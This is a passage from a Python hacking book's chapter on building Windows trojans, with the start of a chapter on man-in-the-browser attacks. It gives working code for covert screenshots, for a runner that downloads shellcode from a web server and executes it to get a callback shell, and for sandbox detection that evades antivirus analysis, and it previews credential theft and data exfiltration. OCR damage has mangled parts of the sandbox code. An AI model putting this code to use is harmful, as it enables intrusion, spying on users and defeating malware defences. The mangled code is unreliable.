import win32con
import win32api
# grab a handle to the main desktop window
u hdesktop = win32gui.GetDesktopWindow()
# determine the size of all monitors in pixels
v width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
# create a device context
w desktop_dc = win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)
# create a memory based device context
x mem_dc = img_dc.CreateCompatibleDC()
Common Trojaning Tasks on Windows 115
# create a bitmap object
y screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc, width, height)
mem_dc.SelectObject(screenshot)
# copy the screen into our memory device context
 mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 # save the bitmap to a file
screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
# free our objects
mem_dc.DeleteDC()
win32gui.DeleteObject(screenshot.GetHandle())
Let’s review what this little script does. First we acquire a handle to the
entire desktop u, which includes the entire viewable area across multiple
monitors. We then determine the size of the screen(s) v so that we know
the dimensions required for the screenshot. We create a device context2
using the GetWindowDC w function call and pass in a handle to our desktop.
Next we need to create a memory-based device context x where we will
store our image capture until we store the bitmap bytes to a file. We then
create a bitmap object y that is set to the device context of our desktop.
The SelectObject call then sets the memory-based device context to point
at the bitmap object that we’re capturing. We use the BitBlt  function
to take a bit-for-bit copy of the desktop image and store it in the memory-
based context. Think of this as a memcpy call for GDI objects. The final step is
to dump this image to disk . This script is easy to test: Just run it from the
command line and check the C:\WINDOWS\Temp directory for your screenshot.bmp
file. Let’s move on to executing shellcode.
Pythonic shellcode execution
There might come a time when you want to be able to interact with one of
your target machines, or use a juicy new exploit module from your favor-
ite penetration testing or exploit framework. This typically—though not
always—requires some form of shellcode execution. In order to execute
raw shellcode, we simply need to create a buffer in memory, and using the
ctypes module, create a function pointer to that memory and call the func-
tion. In our case, we’re going to use urllib2 to grab the shellcode from a
web server in base64 format and then execute it. Let’s get started! Open up
shell_exec.py and enter the following code:
import urllib2
import ctypes
import base64
2. To learn all about device contexts and GDI programming, visit the MSDN page here:
http://msdn.microsoft.com/en-us/library/windows/desktop/dd183553(v=vs.85).aspx.
116 Chapter 8
# retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
u response = urllib2.urlopen(url)
# decode the shellcode from base64
shellcode = base64.b64decode(response.read())
# create a buffer in memory
v shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
# create a function pointer to our shellcode
w shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE¬
(ctypes.c_void_p))
# call our shellcode
x shellcode_func()
How awesome is that? We kick it off by retrieving our base64-encoded
shellcode from our web server u. We then allocate a buffer v to hold
the shellcode after we’ve decoded it. The ctypes cast function allows us to
cast the buffer to act like a function pointer w so that we can call our shell-
code like we would call any normal Python function. We finish it up by call-
ing our function pointer, which then causes the shellcode to execute x.
Kicking the Tires
You can handcode some shellcode or use your favorite pentesting frame-
work like CANVAS or Metasploit3 to generate it for you. I picked some
Windows x86 callback shellcode for CANVAS in my case. Store the raw
shellcode (not the string buffer!) in /tmp/shellcode.raw on your Linux
machine and run the following:
justin$ base64 -i shellcode.raw > shellcode.bin
justin$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
We simply base64-encoded the shellcode using the standard Linux
command line. The next little trick uses the SimpleHTTPServer module to
treat your current working directory (in our case, /tmp/) as its web root.
Any requests for files will be served automatically for you. Now drop your
shell_exec.py script in your Windows VM and execute it. You should see the
following in your Linux terminal:
192.168.112.130 - - [12/Jan/2014 21:36:30] "GET /shellcode.bin HTTP/1.1" 200 -
3. As CANVAS is a commercial tool, take a look at this tutorial for generating Metasploit pay-
loads here: http://www.offensive-security.com/metasploit-unleashed/Generating_Payloads.
Common Trojaning Tasks on Windows 117
This indicates that your script has retrieved the shellcode from the
simple web server that you set up using the SimpleHTTPServer module. If all
goes well, you’ll receive a shell back to your framework, and have popped
calc.exe, or displayed a message box or whatever your shellcode was com-
piled for.
sandbox detection
Increasingly, antivirus solutions employ some form of sandboxing to
determine the behavior of suspicious specimens. Whether this sandbox
runs on the network perimeter, which is becoming more popular, or on
the target machine itself, we must do our best to avoid tipping our hand
to any defense in place on the target’s network. We can use a few indica-
tors to try to determine whether our trojan is executing within a sandbox.
We’ll monitor our target machine for recent user input, including key-
strokes and mouse-clicks.
Then we’ll add some basic intelligence to look for keystrokes, mouse-
clicks, and double-clicks. Our script will also try to determine if the sand-
box operator is sending input repeatedly (i.e., a suspicious rapid succession
of continuous mouse-clicks) in order to try to respond to rudimentary
sandbox detection methods. We’ll compare the last time a user interacted
with the machine versus how long the machine has been running, which
should give us a good idea whether we are inside a sandbox or not. A typi-
cal machine has many interactions at some point during a day since it has
been booted, whereas a sandbox environment usually has no user interac-
tion because sandboxes are typically used as an automated malware analysis
technique.
We can then make a determination as to whether we would like to con-
tinue executing or not. Let’s start working on some sandbox detection code.
Open sandbox_detect.py and throw in the following code:
import ctypes
import random
import time
import sys
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
keystrokes = 0
mouse_clicks = 0
double_clicks = 0
These are the main variables where we are going to track the total
number of mouse-clicks, double-clicks, and keystrokes. Later, we’ll look at
the timing of the mouse events as well. Now let’s create and test some code
118 Chapter 8
for detecting how long the system has been running and how long since the
last user input. Add the following function to your sandbox_detect.py script:
class LASTINPUTINFO(ctypes.Structure):
_fields_ = [("cbSize", ctypes.c_uint),
("dwTime", ctypes.c_ulong)
]
def get_last_input():
struct_lastinputinfo = LASTINPUTINFO()
u struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
# get last input registered
v user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))
# now determine how long the machine has been running
w run_time = kernel32.GetTickCount()
elapsed = run_time - struct_lastinputinfo.dwTime
print "[*] It's been %d milliseconds since the last input event." % ¬
elapsed
return elapsed
# TEST CODE REMOVE AFTER THIS PARAGRAPH!
x while True:
get_last_input()
time.sleep(1)
We define a LASTINPUTINFO structure that will hold the timestamp (in
milli seconds) of when the last input event was detected on the system. Do
note that you have to initialize the cbSize u variable to the size of the struc-
ture before making the call. We then call the GetLastInputInfo v function,
which populates our struct_lastinputinfo.dwTime field with the timestamp.
The next step is to determine how long the system has been running by
using the GetTickCount w function call. The last little snippet of code x is
simple test code where you can run the script and then move the mouse,
or hit a key on the keyboard and see this new piece of code in action.
We’ll define thresholds for these user input values next. But first it’s
worth noting that the total running system time and the last detected user
input event can also be relevant to your particular method of implanta-
tion. For example, if you know that you’re only implanting using a phishing
tactic, then it’s likely that a user had to click or perform some operation to
get infected. This means that within the last minute or two, you would see
user input. If for some reason you see that the machine has been running
for 10 minutes and the last detected input was 10 minutes ago, then you are
likely inside a sandbox that has not processed any user input. These judg-
ment calls are all part of having a good trojan that works consistently.
Common Trojaning Tasks on Windows 119
This same technique can be useful for polling the system to see if a
user is idle or not, as you may only want to start taking screenshots when
they are actively using the machine, and likewise, you may only want to
transmit data or perform other tasks when the user appears to be offline.
You could also, for example, model a user over time to determine what days
and hours they are typically online.
Let’s delete the last three lines of test code, and add some additional
code to look at keystrokes and mouse-clicks. We’ll use a pure ctypes solution
this time as opposed to the PyHook method. You can easily use PyHook
for this purpose as well, but having a couple of different tricks in your tool-
box always helps as each antivirus and sandboxing technology has its own
ways of spotting these tricks. Let’s get coding:
def get_key_press():
global mouse_clicks
global keystrokes
u for i in range(0,0xff):
v if user32.GetAsyncKeyState(i) == -32767:
# 0x1 is the code for a left mouse-click
w if i == 0x1:
mouse_clicks += 1
return time.time()
x elif i > 32 and i = max_input_threshold:
sys.exit(0)
while not detection_complete:
w keypress_time = get_key_press()
if keypress_time is not None and previous_timestamp is not None:
# calculate the time between double clicks
x elapsed = keypress_time - previous_timestamp
# the user double clicked
y if elapsed = max_keystrokes and double_clicks >= max_¬
double_clicks and mouse_clicks >= max_mouse_clicks:
return
previous_timestamp = keypress_time
elif keypress_time is not None:
previous_timestamp = keypress_time
detect_sandbox()
print "We are ok!"
Common Trojaning Tasks on Windows 121
All right. Be mindful of the indentation in the code blocks above!
We start by defining some variables u to track the timing of mouse-clicks,
and some thresholds with regard to how many keystrokes or mouse-clicks
we’re happy with before considering ourselves running outside a sandbox.
We randomize these thresholds with each run, but you can of course set
thresholds of your own based on your own testing.
We then retrieve the elapsed time v since some form of user input has
been registered on the system, and if we feel that it’s been too long since
we’ve seen input (based on how the infection took place as mentioned pre-
viously), we bail out and the trojan dies. Instead of dying here, you could
also choose to do some innocuous activity such as reading random registry
keys or checking files. After we pass this initial check, we move on to our
primary keystroke and mouse-click detection loop.
We first check for keypresses or mouse-clicks w and we know that if
the function returns a value, it is the timestamp of when the mouse-click
occurred. Next we calculate the time elapsed between mouse-clicks x and
then compare it to our threshold y to determine whether it was a double-
click. Along with double-click detection, we’re looking to see if the sandbox
operator has been streaming click events  into the sandbox to try to fake
out sandbox detection techniques. For example, it would be rather odd to
see 100 double-clicks in a row during typical computer usage. If the maxi-
mum number of double-clicks has been reached and they happened in
rapid succession , we bail out. Our final step is to see if we have made it
through all of the checks and reached our maximum number of clicks, key-
strokes, and double-clicks ; if so, we break out of our sandbox detection
function.
I encourage you to tweak and play with the settings, and to add addi-
tional features such as virtual machine detection. It might be worthwhile to
track typical usage in terms of mouse-clicks, double-clicks, and keystrokes
across a few computers that you own (I mean possess—not ones that you
hacked into!) to see where you feel the happy spot is. Depending on your
target, you may want more paranoid settings or you may not be concerned
with sandbox detection at all. Using the tools that you developed in this
chapter can act as a base layer of features to roll out in your trojan, and
due to the modularity of our trojaning framework, you can choose to
deploy any one of them.
122 Chapter 8
9
fUn witH i nterne t e xPlorer
Windows COM automation serves a number of practi-
cal uses, from interacting with network-based services
to embedding a Microsoft Excel spreadsheet into your
own application. All versions of Windows from XP for-
ward allow you to embed an Internet Explorer COM
object into applications, and we’ll take advantage of this ability in this
chapter. Using the native IE automation object, we’ll create a man-in-the-
browser-style attack where we can steal credentials from a website while a
user is interacting with it. We’ll make this credential-stealing attack extend-
able, so that several target websites can be harvested. The last step will use
Internet Explorer as a means to exfiltrate data from a target system. We’ll
include some public key crypto to protect the exfiltrated data so that only
we can decrypt it.
Internet Explorer, you say? Even though other browsers like Google
Chrome and Mozilla Firefox are more popular these days, most corporate
environments still use Internet Explorer as their default browser. And of
course, you can’t remove Internet Explorer from a Windows system—so this
technique should always be available to your Windows trojan.
Man-in-the-Browser (kind of)
Man-in-the-browser (MitB) attacks have been around since the turn of the
new millennium. They are a variation on the classic man-in-the-middle
attack. Instead of acting in the middle of a communication, malware installs
itself and steals credentials or sensitive information from the unsuspect-
ing target’s browser. Most of these malware strains (typically called Browser
Helper Objects) insert themselves into the browser or otherwise inject code so
that they can manipulate the browser process itself. As browser developers
become wise to these techniques and antivirus vendors increasingly look for